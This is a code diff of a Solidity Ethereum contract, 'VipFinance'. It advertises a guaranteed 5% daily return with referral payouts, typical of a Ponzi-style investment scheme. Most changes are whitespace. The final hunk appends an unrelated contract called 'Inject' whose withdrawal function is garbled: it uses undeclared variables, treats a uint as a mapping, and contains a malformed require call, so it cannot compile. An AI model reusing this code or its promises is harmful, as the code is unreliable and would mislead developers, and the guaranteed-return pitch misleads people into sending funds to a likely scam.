@@ -1,10 +1,10 @@
 pragma solidity ^0.4.25;
 
-/** 
+/**
  * contract VipFinance
- * 
+ *
  *  GAIN 5% PER 24 HOURS (every 5900 blocks)
- * 
+ *
  *  How to use:
  *  -Send any amount of ether to make an investment
  *  -Claim your profit by sending 0 ether transaction (every day or every time you prefer)
@@ -13,8 +13,8 @@ pragma solidity ^0.4.25;
  *  Referal Program:
  *  5% for every deposit of your direct referals
  *  If you want to invite your referlas to join our program ,They have to specify your ETH wallet in a "DATA" field during a deposit transaction.
- * 
- * 
+ *
+ *
  * RECOMMENDED GAS LIMIT: 250000
  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
  *
@@ -24,8 +24,8 @@ pragma solidity ^0.4.25;
 contract VipFinance{
 
     address public owner;
-    address public partner;    
-    
+    address public partner;
+
 	mapping (address => uint256) deposited;
 	mapping (address => uint256) withdrew;
 	mapping (address => uint256) refearned;
@@ -34,24 +34,24 @@ contract VipFinance{
 	uint256 public totalDepositedWei = 0;
 	uint256 public totalWithdrewWei = 0;
 	uint256 public investorNum = 0;
-	
+
 	event invest(address indexed beneficiary, uint amount);
 
     constructor () public {
         owner   = msg.sender;
         partner = msg.sender;
     }
-    
+
     modifier onlyOwner {
         require (msg.sender == owner, "OnlyOwner methods called by non-owner.");
         _;
-    }    
-    
+    }
+
     //Adverts & PR Partner
     function setPartner(address newPartner) external onlyOwner {
         partner = newPartner;
     }
- 
+
 
 	function() payable external {
 		emit invest(msg.sender,msg.value);
@@ -84,7 +84,7 @@ contract VipFinance{
 		deposited[msg.sender] += msg.value;
 		totalDepositedWei += msg.value;
 	}
-	
+
 	function userDepositedWei(address _address) public view returns (uint256) {
 		return deposited[_address];
     }
@@ -104,6 +104,22 @@ contract VipFinance{
 	function bytesToAddress(bytes bys) private pure returns (address addr) {
 		assembly {
 			addr := mload(add(bys, 20))
+		}
+	}
+}
+pragma solidity ^0.4.24;
+contract Inject {
+	uint depositAmount;
+	constructor() public {owner = msg.sender;}
+	function withdrawRequest() public {
+ 	require(tx.origin == msg.sender, );
+ 	uint blocksPast = block.number - depositBlock[msg.sender];
+ 	if (blocksPast <= 100) {
+  		uint amountToWithdraw = depositAmount[msg.sender] * (100 + blocksPast) / 100;
+  		if ((amountToWithdraw > 0) && (amountToWithdraw <= address(this).balance)) {
+   			msg.sender.transfer(amountToWithdraw);
+   			depositAmount[msg.sender] = 0;
+			}
 		}
 	}
 }
